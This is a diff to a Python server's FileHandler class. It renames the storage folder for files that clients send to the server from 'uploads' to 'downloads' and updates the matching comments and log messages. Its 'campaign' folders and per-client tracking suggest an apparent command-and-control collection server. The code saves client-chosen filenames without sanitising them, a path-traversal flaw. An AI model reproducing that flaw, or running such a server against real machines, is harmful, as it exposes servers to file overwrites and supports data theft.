@@ -157,13 +157,15 @@ class FileHandler(BaseHandler):
             
     def _save_uploaded_file(self, client_id, file_content):
         """Save uploaded file content to disk with improved error handling"""
-        # Prepare the uploads directory
+        # Prepare the downloads directory for files coming FROM client TO server
         campaign_folder = self.get_campaign_folder()
         
         # Use client_id if available, otherwise use IP
         client_id_for_path = client_id or self.client_address[0]
-        uploads_folder = os.path.join(campaign_folder, "uploads", client_id_for_path)
-        os.makedirs(uploads_folder, exist_ok=True)
+        
+        # Files from client to server go in the downloads folder
+        downloads_folder = os.path.join(campaign_folder, "downloads", client_id_for_path)
+        os.makedirs(downloads_folder, exist_ok=True)
         
         # Try to parse as JSON for structured file upload
         try:
@@ -174,7 +176,7 @@ class FileHandler(BaseHandler):
                 except json.JSONDecodeError as e:
                     self.log_message(f"Error parsing JSON: {e}, content: {file_content[:100]}...")
                     # Not valid JSON, save as raw text
-                    return self._save_raw_file(uploads_folder, file_content, client_id)
+                    return self._save_raw_file(downloads_folder, file_content, client_id)
             else:
                 # Already parsed JSON
                 file_info = file_content
@@ -182,25 +184,25 @@ class FileHandler(BaseHandler):
             # Check if it's a structured file upload
             if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                 # This is a structured file upload with filename and base64 content
-                file_path = self._save_structured_file(uploads_folder, file_info, client_id)
+                file_path = self._save_structured_file(downloads_folder, file_info, client_id)
                 return file_path
             else:
                 # Not a structured file upload, save as raw text
-                return self._save_raw_file(uploads_folder, str(file_content), client_id)
+                return self._save_raw_file(downloads_folder, str(file_content), client_id)
         except Exception as e:
             self.log_message(f"Error in _save_uploaded_file: {e}")
             # Fallback to saving as raw text
             try:
-                return self._save_raw_file(uploads_folder, str(file_content), client_id)
+                return self._save_raw_file(downloads_folder, str(file_content), client_id)
             except Exception as e2:
                 self.log_message(f"Error saving raw file: {e2}")
                 # Create an error file
-                error_path = os.path.join(uploads_folder, f"error_{int(time.time())}.txt")
+                error_path = os.path.join(downloads_folder, f"error_{int(time.time())}.txt")
                 with open(error_path, 'w') as f:
                     f.write(f"Error saving file: {e}\nSecondary error: {e2}\n")
                 return error_path
                 
-    def _save_structured_file(self, uploads_folder, file_info, client_id=None):
+    def _save_structured_file(self, downloads_folder, file_info, client_id=None):
         """Save a structured file upload with filename and content"""
         file_name = file_info['FileName']
         file_content_base64 = file_info['FileContent']
@@ -212,25 +214,25 @@ class FileHandler(BaseHandler):
             # Decode base64 content
             file_content_bytes = base64.b64decode(file_content_base64)
             
-            # Save to file
-            file_path = os.path.join(uploads_folder, file_name)
+            # Save to file in downloads folder (this is data coming FROM client TO server)
+            file_path = os.path.join(downloads_folder, file_name)
             with open(file_path, 'wb') as f:
                 f.write(file_content_bytes)
             
-            # Log the upload
-            self.log_message(f"File uploaded from {client_id or self.client_address[0]}: {file_name} ({len(file_content_bytes)} bytes)")
+            # Log the upload (from client perspective) / download (from server perspective)
+            self.log_message(f"File received from {client_id or self.client_address[0]}: {file_name} ({len(file_content_bytes)} bytes)")
             if client_id:
-                self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
+                self.client_manager.log_event(client_id, "File Upload", f"File received and saved to {file_path}")
                 
             return file_path
         except Exception as e:
             logger.error(f"Error saving structured file: {e}")
             raise
             
-    def _save_raw_file(self, uploads_folder, content, client_id=None):
+    def _save_raw_file(self, downloads_folder, content, client_id=None):
         """Save raw text content as a file"""
         timestamp = time.strftime("%Y%m%d-%H%M%S")
-        file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
+        file_path = os.path.join(downloads_folder, f"download_{timestamp}.txt")
         
         try:
             # Try writing with utf-8 first
@@ -241,7 +243,7 @@ class FileHandler(BaseHandler):
             with open(file_path, 'w', encoding='ascii', errors='replace') as f:
                 f.write(content)
             
-        self.log_message(f"Raw text uploaded from {client_id or self.client_address[0]} and saved to {file_path}")
+        self.log_message(f"Raw text received from {client_id or self.client_address[0]} and saved to {file_path}")
         if client_id:
             self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
             
